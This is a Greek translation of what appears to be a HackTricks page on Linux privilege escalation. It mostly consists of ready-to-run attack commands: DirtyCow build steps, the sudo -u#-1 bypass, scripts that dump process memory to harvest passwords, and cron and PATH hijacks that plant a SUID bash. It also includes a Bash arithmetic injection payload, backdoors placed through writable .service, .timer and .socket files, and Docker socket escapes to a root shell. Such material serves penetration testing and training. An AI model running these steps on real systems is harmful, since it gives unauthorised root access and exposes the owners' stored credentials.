# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας αρχίσουμε να συλλέγουμε πληροφορίες για το OS που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Εάν **έχετε write permissions σε οποιονδήποτε φάκελο μέσα στη `PATH`** μεταβλητή, ίσως να μπορείτε να hijack μερικές libraries ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με ευπαθή kernel και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευπαθείς εκδόσεις kernel από αυτή την ιστοσελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση για kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε στο θύμα, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **ψάξτε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και έτσι θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo έκδοση

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε εάν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: η επαλήθευση υπογραφής απέτυχε

Ελέγξτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς θα μπορούσε να εκμεταλλευτεί αυτή η vuln.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περαιτέρω αναγνώριση συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγράψτε πιθανές άμυνες

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **what is mounted and unmounted**, πού και γιατί. Αν κάτι είναι unmounted μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαριθμήστε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, έλεγξε αν **κάποιος compiler είναι εγκατεστημένος**. Αυτό είναι χρήσιμο εάν χρειαστεί να χρησιμοποιήσεις κάποιο kernel exploit, καθώς συνιστάται να το compile στη μηχανή όπου θα το χρησιμοποιήσεις (ή σε μία παρόμοια).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευάλωτο Λογισμικό

Ελέγξτε για την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευτεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε SSH πρόσβαση στη μηχανή μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε για ξεπερασμένο και ευπαθές λογισμικό εγκατεστημένο μέσα στη μηχανή.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, επομένως συνιστώνται εφαρμογές όπως το OpenVAS ή παρόμοιες που θα ελέγξουν αν οποιαδήποτε εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διεργασίες

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε processes. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες processes που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Process memory

Ορισμένες υπηρεσίες ενός server αποθηκεύουν **credentials in clear text inside the memory**.\
Συνήθως θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη των processes που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα credentials.\
Ωστόσο, θυμηθείτε ότι **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Σημειώστε ότι στις μέρες μας τα περισσότερα μηχανήματα **don't allow ptrace by default**, πράγμα που σημαίνει ότι δεν μπορείτε να dumpάρετε άλλες processes που ανήκουν στον unprivileged user σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Αυτή είναι η κλασική λειτουργία του ptracing.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Σενάριο
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο PID, **maps δείχνουν πώς η μνήμη απεικονίζεται εντός του εικονικού χώρου διευθύνσεων της διεργασίας**; επίσης δείχνουν τα **δικαιώματα κάθε απεικονιζόμενης περιοχής**. Το **mem** ψευδο-αρχείο **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις (offsets) τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek into the mem file and dump all readable regions** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο χώρος εικονικών διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\\
Τυπικά, `/dev/mem` είναι αναγνώσιμο μόνο από τον χρήστη **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

Το ProcDump είναι μια αναδημιούργηση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Μπορείς να το βρεις στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις root και να κάνετε dump τη διεργασία που σας ανήκει
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν βρείτε ότι η διαδικασία authenticator είναι σε λειτουργία:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να κάνετε dump τη διαδικασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους για να κάνετε dump τη μνήμη μιας διαδικασίας) και να αναζητήσετε credentials μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) θα **κλέψει credentials σε απλό κείμενο από τη μνήμη** και από κάποια **γνωστά αρχεία**. Απαιτεί root privileges για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                   | Όνομα διεργασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

Έλεγξε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείς να εκμεταλλευτείς ένα script που εκτελείται από root (wildcard vuln; μπορείς να τροποποιήσεις αρχεία που χρησιμοποιεί το root; να χρησιμοποιήσεις symlinks; να δημιουργήσεις συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί το root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\

Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Εάν ένα script που εκτελείται από root περιέχει ένα “**\***” μέσα σε μια εντολή, μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε απρόβλεπτες ενέργειες (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το wildcard προηγείται μιας διαδρομής όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμα και** _**./\***_ **δεν είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα κόλπα εκμετάλλευσης wildcards:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Αν ένας root cron/parser διαβάζει μη έμπιστα πεδία log και τα τροφοδοτεί σε έναν arithmetic context, ένας attacker μπορεί να εγχύσει μια command substitution $(...) που εκτελείται ως root όταν τρέξει ο cron.

- Why it works: Στο Bash, οι expansions γίνονται με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` πρώτα υποκαθίσταται (τρέχοντας την εντολή), και στη συνέχεια το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για την αριθμητική ώστε το script να συνεχίσει χωρίς σφάλματα.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Γράψτε attacker-controlled κείμενο στο parsed log έτσι ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει μια command substitution και να τελειώνει με ένα ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή ανακατευθύνετέ το) ώστε η αριθμητική να παραμένει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από root, μπορείτε να αποκτήσετε shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **κατάλογο στον οποίο έχεις πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψεις αυτόν τον φάκελο και να **δημιουργήσεις έναν symlink προς κάποιον άλλο φάκελο** που θα εξυπηρετεί ένα script υπό τον έλεγχό σου.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Συχνές cron jobs

Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορείτε να το εκμεταλλευτείτε και να αναβαθμίσετε τα δικαιώματά σας.

Για παράδειγμα, για να **παρακολουθείτε κάθε 0.1s για 1 λεπτό**, **να ταξινομήσετε κατά τις λιγότερο εκτελεσμένες εντολές** και να διαγράψετε τις εντολές που έχουν εκτελεστεί περισσότερο, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε process που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατόν να δημιουργηθεί ένα cronjob **τοποθετώντας ένα carriage return μετά από ένα σχόλιο** (χωρίς newline character), και το cronjob θα λειτουργήσει. Παράδειγμα (προσέξτε το carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, μπορείτε να το **τροποποιήσετε** ώστε να **εκτελεί** το **backdoor** σας όταν η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι να επανεκκινηθεί η μηχανή).\
Για παράδειγμα δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα binaries υπηρεσιών

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής πάνω σε binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors ώστε όταν οι υπηρεσίες ξαναεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Σχετικές Διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Εάν διαπιστώσετε ότι μπορείτε να **write** σε οποιονδήποτε από τους φακέλους της διαδρομής, ίσως να μπορέσετε να **escalate privileges**. Πρέπει να αναζητήσετε αρχεία που χρησιμοποιούν **relative paths being used on service configurations**, όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με **το ίδιο όνομα με το δυαδικό αρχείο του σχετικού μονοπατιού** μέσα στον systemd PATH φάκελο στον οποίο μπορείτε να γράψετε, και όταν η υπηρεσία ζητήσει να εκτελέσει την ευπαθή ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σας θα εκτελεστεί (χρήστες χωρίς προνόμια συνήθως δεν μπορούν να start/stop υπηρεσίες αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Χρονοδιακόπτες**

Οι **Χρονοδιακόπτες** είναι αρχεία μονάδων systemd των οποίων το όνομα τελειώνει σε `**.timer**` και ελέγχουν αρχεία ή γεγονότα `**.service**`. Οι **Χρονοδιακόπτες** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα χρόνου ημερολογίου και μονοτονικά χρονικά γεγονότα και μπορούν να τρέξουν ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονοδιακόπτες με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Εάν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποιες υπάρχουσες μονάδες του systemd.unit (όπως `.service` ή `.target`)
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Η μονάδα που θα ενεργοποιηθεί όταν αυτός ο timer λήξει. Το όρισμα είναι ένα όνομα μονάδας, του οποίου το επίθημα δεν είναι ".timer". Εάν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια υπηρεσία που έχει το ίδιο όνομα με τη μονάδα timer, εκτός από το επίθημα. (Δείτε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας timer να ονομάζονται ταυτόσημα, εκτός από το επίθημα.

Therefore, to abuse this permission you would need to:

- Βρείτε κάποια systemd unit (όπως ένα `.service`) που είναι **εκτελώντας ένα εκτελέσιμο αρχείο με δικαιώματα εγγραφής**
- Βρείτε κάποια systemd unit που **εκτελεί μια σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** πάνω στο **systemd PATH** (για να παραστήσετε εκείνο το εκτελέσιμο)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

Για να ενεργοποιήσετε ένα timer χρειάζεστε προνόμια root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** με τη δημιουργία ενός symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** σε ίδιες ή διαφορετικές μηχανές εντός μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία descriptor του Unix για επικοινωνία μεταξύ μηχανών και ρυθμίζονται μέσω `.socket` αρχείων.

Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν αλλά σε γενικές γραμμές χρησιμοποιούνται για να **υποδείξουν πού θα ακούει** το socket (το path του AF_UNIX socket αρχείου, το IPv4/6 και/ή τον αριθμό θύρας για ακρόαση, κ.λπ.)
- `Accept`: Παίρνει ένα boolean όρισμα. Αν **true**, μια **instance υπηρεσίας spawnάρεται για κάθε εισερχόμενη σύνδεση** και μόνο το socket της σύνδεσης περνάει σε αυτή. Αν **false**, όλα τα listening sockets οι ίδιοι **πέρανται στη gestart service unit**, και μόνο μία service unit spawnάρεται για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μία service unit αδιαμφισβήτητα χειρίζεται όλη την εισερχόμενη κίνηση. **Προεπιλογή false**. Για λόγους απόδοσης, συνιστάται να γράφονται νέοι daemons με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Παίρνουν μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **δημιουργηθούν** και δεθούν, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από επιχειρήματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **κλείσουν** και αφαιρεθούν, αντίστοιχα.
- `Service`: Προσδιορίζει το όνομα της **service** unit που **θα ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλογή είναι η service που φέρει το ίδιο όνομα με το socket (με το επίθημα αντικατεστημένο). Στις περισσότερες περιπτώσεις δεν θα είναι απαραίτητο να χρησιμοποιήσετε αυτή την επιλογή.

### Εγγράψιμα .socket αρχεία

Αν βρείτε ένα **εγγράψιμο** αρχείο `.socket` μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν το socket δημιουργηθεί. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot της μηχανής.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Εγγράψιμα sockets

Αν εντοπίσετε κάποιο εγγράψιμο socket (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Εντοπισμός Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets που ακούνε HTTP** requests (_Δεν αναφέρομαι σε .socket files αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Αν το socket **απαντήσει σε ένα HTTP** αίτημα, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **exploit some vulnerability**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατευτεί. Κατά προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιωμάτων εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Παρακάτω ακολουθεί ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικοί τρόποι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Εάν έχετε δικαίωμα εγγραφής στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
